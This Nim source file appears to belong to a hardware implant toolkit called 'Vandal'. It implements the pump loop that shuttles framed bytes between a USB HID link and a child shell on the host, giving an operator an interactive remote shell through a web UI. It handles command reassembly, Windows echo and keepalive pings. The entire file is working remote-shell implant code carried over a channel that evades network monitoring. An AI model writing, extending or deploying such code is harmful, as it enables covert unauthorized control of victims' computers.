## Bidirectional pump: shovels bytes between the HID link and the
## child shell, framing/unframing on the fly. Single-threaded event
## loop: alternates short reads from each side and never blocks
## indefinitely.

import std/[options, times]
import ./protocol, ./transport_hid, ./shell_child

type
  PumpStats* = object
    txSeq*: uint16
    rxSeq*: uint16
    bytesIn*: uint64
    bytesOut*: uint64

const
  ChildReadChunk = 60  ## one HID frame payload
  IdlePollMs     = 5
  PingIntervalMs = 5_000

proc nextSeq(stats: var PumpStats): uint16 =
  result = stats.txSeq
  stats.txSeq = (stats.txSeq + 1'u16) and 0xFFFF'u16

proc sendCtrl*(link: HidLink, stats: var PumpStats,
               subtype: uint8, extra: openArray[uint8] = []): bool =
  var f = Frame(typ: TypeCtrl, flags: FlagFin, seq: nextSeq(stats))
  f.payload[0] = subtype
  let n = min(extra.len, FramePayloadSize - 1)
  if n > 0:
    copyMem(addr f.payload[1], unsafeAddr extra[0], n)
  f.payloadLen = 1 + n
  return link.sendFrame(f)

proc sendOut(link: HidLink, stats: var PumpStats,
             data: openArray[uint8]): bool =
  ## Fragment `data` into OUT frames; last frame carries FIN.
  if data.len == 0:
    return true
  var off = 0
  while off < data.len:
    let take = min(FramePayloadSize, data.len - off)
    let last = (off + take) >= data.len
    var f = Frame(
      typ: TypeOut,
      flags: if last: FlagFin else: 0'u8,
      seq: nextSeq(stats),
      payloadLen: take,
    )
    copyMem(addr f.payload[0], unsafeAddr data[off], take)
    if not link.sendFrame(f):
      return false
    off += take
  return true

proc runPump*(link: HidLink, child: ShellChild,
              debug: proc(msg: string) = nil) =
  var stats = PumpStats()

  # Reassembly state for incoming CMD frames (agent -> host).
  var cmdAcc = newSeq[uint8]()

  # NOTE: no HELLO handshake here. `findVandalShell` already probed the
  # link with a HELLO/HELLO_ACK exchange to disambiguate the Vandal
  # agent from the other vendor-page HID devices on the host, so by
  # the time we enter the pump the agent has already received exactly
  # one HELLO and replied. Re-sending it would trigger a second
  # `payload connected` notification in the web UI for no benefit.

  if debug != nil: debug("Connected; entering pump loop")

  var lastPing = epochTime()
  var childBuf = newSeq[uint8](ChildReadChunk)

  while child.isAlive:
    # --- Drain inbound HID frames (agent -> host) ---
    let frameOpt = link.readFrame(IdlePollMs)
    if frameOpt.isSome:
      let f = frameOpt.get
      case f.typ
      of TypeCmd:
        if f.payloadLen > 0:
          let oldLen = cmdAcc.len
          cmdAcc.setLen(oldLen + f.payloadLen)
          copyMem(addr cmdAcc[oldLen], unsafeAddr f.payload[0], f.payloadLen)
        if f.isFin:
          if cmdAcc.len > 0:
            child.writeBytes(cmdAcc)
            stats.bytesIn += uint64(cmdAcc.len)
            when defined(windows):
              # cmd.exe driven through a pipe has no line-discipline
              # echo (a real POSIX TTY would echo via `onlcr`/`echo`).
              # Without server-side echo the operator types into a
              # silent web shell. Mirror the input back as OUT bytes,
              # converting bare CR to CRLF so xterm.js advances the
              # cursor to the next line the way it would on a TTY.
              var echoBuf = newSeqOfCap[uint8](cmdAcc.len + 4)
              for i, b in cmdAcc:
                echoBuf.add b
                if b == 0x0D'u8 and
                   (i + 1 >= cmdAcc.len or cmdAcc[i + 1] != 0x0A'u8):
                  echoBuf.add 0x0A'u8
              discard sendOut(link, stats, echoBuf)
            cmdAcc.setLen(0)
      of TypeCtrl:
        case f.payload[0]
        of CtrlPing:
          discard sendCtrl(link, stats, CtrlPong)
        of CtrlPong:
          discard
        of CtrlCmdId:
          # Forwarded for UI tagging; agent ignores echoes, so just log.
          if debug != nil:
            let endIdx = block:
              var i = 1
              while i < f.payloadLen and f.payload[i] != 0: inc i
              i
            discard endIdx
        of CtrlBye:
          if debug != nil: debug("Agent sent BYE, exiting")
          return
        else:
          discard
      else:
        discard

    # --- Drain child shell output (host -> agent) ---
    let n = child.tryReadBytes(childBuf, ChildReadChunk)
    if n > 0:
      if not sendOut(link, stats, childBuf.toOpenArray(0, n - 1)):
        if debug != nil: debug("HID write failed, exiting")
        return
      stats.bytesOut += uint64(n)

    # --- Periodic liveness ping ---
    let now = epochTime()
    if (now - lastPing) * 1000 >= float(PingIntervalMs):
      discard sendCtrl(link, stats, CtrlPing)
      lastPing = now
